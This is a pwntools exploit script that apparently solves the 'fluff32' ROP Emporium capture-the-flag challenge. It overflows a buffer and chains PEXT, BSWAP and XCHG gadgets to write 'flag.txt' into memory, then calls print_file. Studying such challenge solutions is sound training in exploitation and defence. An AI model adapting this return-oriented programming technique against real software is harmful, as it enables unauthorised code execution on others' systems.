from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *pwnme + 177
continue
'''.format(**locals())

exe = './fluff32'
elf = context.binary = ELF(exe, checksec=False)
p = start()

pext = 0x08048543            # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
xchg = 0x08048555            # xchg   BYTE PTR [ecx], dl
bswap = 0x08048558           # pop ecx; bswap ecx; ret;     
pos = elf.bss() + 0x100      # pos -> 'flag.txt'
pop_ebp = 0x080485bb

def genSelector(target):
    # https://en.wikipedia.org/wiki/X86_Bit_manipulation_instruction_set
    # Instruction 	Selector mask 	Source 	    Destination 
    # PEXT 	        0xff00fff0   	0x12345678 	0x00012567
    # edx           eax             ebx         edx
    source = bin(0xb0bababa)[2:].zfill(32)[::-1]      # 10110000101110101011101010111010
    target = bin(target)[2:].zfill(8)[::-1]           # 1100110
    res = 0
    j = 0
    for i in range(8):
        while source[j] != target[i]: j += 1
        res += 1 << j
        j += 1
    return res

# ===== Exploit script here =====
payload = b'A'*44

for i, b in enumerate(b'flag.txt'):
    payload += p32(bswap) + p32(pos + i, endian='big')
    payload += p32(pop_ebp) + p32(genSelector(b)) + p32(pext) + p32(xchg)

payload += p32(elf.plt['print_file']) + p32(0) + p32(pos)
p.sendlineafter(b'> ', payload)

p.interactive()
